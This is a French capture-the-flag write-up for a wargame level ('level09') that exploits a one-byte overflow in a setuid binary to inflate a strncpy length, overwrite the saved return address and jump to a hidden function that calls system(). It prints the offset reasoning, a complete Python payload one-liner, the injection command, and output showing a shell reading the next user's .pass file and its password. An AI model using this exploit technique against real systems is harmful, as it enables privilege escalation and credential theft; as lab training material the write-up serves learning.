# Level09

### Repérage

```
ls -la
-rwsr-s---+ 1 end users ... level09
```

Bit setuid, propriétaire end. Si on obtient un shell, il sera aux droits de end (le dernier niveau).


### La fonction cadeau : secret_backdoor

```
void secret_backdoor(void) {
    char local_88 [128];
    fgets(local_88, 0x80, stdin);
    system(local_88);          // execute la commande qu'on lui donne
}
```

Cette fonction n'est jamais appelée par le flux normal. Mais si on détourne l'exécution vers elle, elle lit une ligne et la passe à system() -> on tape /bin/sh et on a un shell. C'est notre cible : il suffit de rediriger l'exécution dessus.

secret_backdoor est à l'offset 0x88c dans le binaire.

### La structure de données

Les deux prompts (username, message) sont stockés dans une structure :

```
struct s_message {
    char text[140];     // message
    char username[40];  // username
    int  len;           // = 140 (0x8c), sert de taille au strncpy
};
```
- text     à l'offset 0
- username à l'offset 0x8c (140)
- len      à l'offset 0xb4 (180)

### La faille : 1-byte overflow qui débloque un strncpy

Deux fonctions remplissent la structure, de deux manières différentes :

set_username : copie caractère par caractère dans une boucle
```
for (i = 0; i < 0x29 && buf[i] != '\0'; i++)
    *(struct + 0x8c + i) = buf[i];
```
La boucle tourne jusqu'à 0x29 = 41 fois. username est à l'offset 0x8c, len est à 0xb4.
```
0xb4 - 0x8c = 0x28 = 40
```
Donc les octets 0..39 remplissent username, et le 41e octet (index 40) déborde d'un octet sur len -> on écrase l'octet de poids fort de len -> on controle sa valeur.

set_msg : copie avec strncpy, en utilisant len comme taille
```
fgets(local_408, 0x400, stdin);
strncpy(struct, local_408, *(int *)(struct + 0xb4));   // taille = len (qu'on controle !)
```
En ayant gonflé len via le 1-byte overflow, ce strncpy copie beaucoup plus que 140 octets -> on déborde le buffer text et on écrase la saved RIP.

### Offset jusqu'à la saved RIP

D'après le disas de handle_msg :
```
sub $0xc0,%rsp           -> le buffer (struct) est à rbp - 0xc0 (192)
push rbp                 -> saved RBP à rbp (192 depuis le buffer)
saved RIP à rbp + 8      -> soit buffer + 192 + 8 = buffer + 200
```
Donc il faut 200 octets de padding dans le message, puis l'adresse à écrire.

### L'adresse de secret_backdoor

```
cat /proc/sys/kernel/randomize_va_space
0
```
ASLR désactivé système-wide -> la base PIE est FIXE, même hors gdb :
base = 0x555555554000 (la même que sous gdb).
```
secret_backdoor = base + 0x88c = 0x55555555488c
```
En little-endian 8 octets : \x8c\x48\x55\x55\x55\x55\x00\x00

### Le payload

```
username : 40*'a' + '\xd4'        -> le 41e octet gonfle len (strncpy long)
message  : 200*'a' + adresse      -> ecrase la saved RIP (buffer+200) avec secret_backdoor
```

Génération du payload (2 lignes : username, message) :
```
python -c "print 40*'a' + '\xd4' + '\n' + 'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" 
```

### Injection finale


```
(python -c "print 40*'a' + '\xd4' + '\n' + 'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh                    <- lu par le fgets de secret_backdoor -> system("/bin/sh")
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
